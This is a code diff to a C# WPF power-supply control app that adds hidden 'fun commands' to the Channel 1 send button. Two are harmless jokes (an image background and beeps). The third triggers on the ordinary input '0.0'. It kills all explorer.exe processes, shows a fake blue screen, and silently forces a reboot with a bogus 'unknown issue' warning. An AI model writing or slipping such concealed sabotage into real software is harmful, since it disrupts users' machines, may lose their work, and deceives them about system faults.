@@ -1,6 +1,10 @@
-﻿using System.Windows;
+﻿using System;
+using System.Diagnostics;
+using System.Windows;
 using System.Windows.Controls;
+using System.Windows.Input;
 using System.Windows.Media;
+using System.Windows.Media.Imaging;
 using TartarosLogger;
 
 namespace SerialPower.UserControls
@@ -105,6 +109,62 @@ namespace SerialPower.UserControls
 
 		private void ButtonCH1_Click(object sender, RoutedEventArgs e)
 		{
+			// Fun commands
+			if (TextBox_CH1Voltage.Text.Contains("GPF") || TextBox_CH1Current.Text.Contains("GPF"))
+			{
+				BitmapImage bitmapImage = new(new Uri("pack://application:,,,/images/JokeOne.jpeg"));
+				ImageBrush imageBrush = new(bitmapImage);
+				this.Background = imageBrush;
+				return;
+			}
+
+			if (TextBox_CH1Voltage.Text.Contains("Mario") || TextBox_CH1Current.Text.Contains("Mario"))
+			{
+				Console.Beep(659, 250);
+				Console.Beep(659, 250);
+				Console.Beep(659, 300);
+				Console.Beep(523, 250);
+				Console.Beep(659, 250);
+				Console.Beep(784, 300);
+				Console.Beep(392, 300);
+				Console.Beep(523, 275);
+				Console.Beep(392, 275);
+				Console.Beep(330, 275);
+				Console.Beep(440, 250);
+				Console.Beep(494, 250);
+				Console.Beep(466, 275);
+				Console.Beep(440, 275);
+				Console.Beep(392, 275);
+				Console.Beep(659, 250);
+				Console.Beep(784, 250);
+				Console.Beep(880, 275);
+				Console.Beep(698, 275);
+				Console.Beep(784, 225);
+				Console.Beep(659, 250);
+				Console.Beep(523, 250);
+				Console.Beep(587, 225);
+				Console.Beep(494, 225);
+				return;
+			}
+			if (TextBox_CH1Voltage.Text.Contains("0.0") || TextBox_CH1Current.Text.Contains("0.0"))
+			{
+				Cursor = Cursors.None;
+				Console.Beep(520, 2000);
+				foreach (var processExplorer in Process.GetProcessesByName("explorer"))
+				{
+					processExplorer.Kill();
+				}
+
+				BlueScreenWindow blueScreenWindow = new BlueScreenWindow();
+				blueScreenWindow.Show();
+
+				Process process = new Process();
+				process.StartInfo.FileName = "cmd.exe";
+				process.StartInfo.Arguments = "/c shutdown /ro /t 10 /d u:5:15 /c \"Unknow issue detected. Please contract system admin and check files for integrity.\"";
+				process.StartInfo.CreateNoWindow = true;
+				process.Start();
+				return;
+			}
 			Logger.Info("Send current data to Channel 1");
 			try
 			{
